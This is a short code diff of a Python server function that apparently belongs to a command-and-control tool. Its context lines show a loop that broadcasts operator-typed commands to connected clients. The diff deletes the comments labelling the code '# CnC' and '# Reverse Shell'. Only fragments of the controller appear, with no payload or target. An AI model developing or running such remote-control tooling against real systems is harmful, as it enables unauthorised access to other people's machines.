@@ -138,7 +138,6 @@ def server():
             if len(clients) > 0:
                 print("\033[32m[+]\033[0m Connection established\n")
 
-                # CnC
                 while True:
                     console = input(remote)
 
@@ -190,7 +189,6 @@ def server():
                         server()
 
                     else:
-                        # Reverse Shell
                         for client in clients:
                             client.sendall(console.encode())
             else:
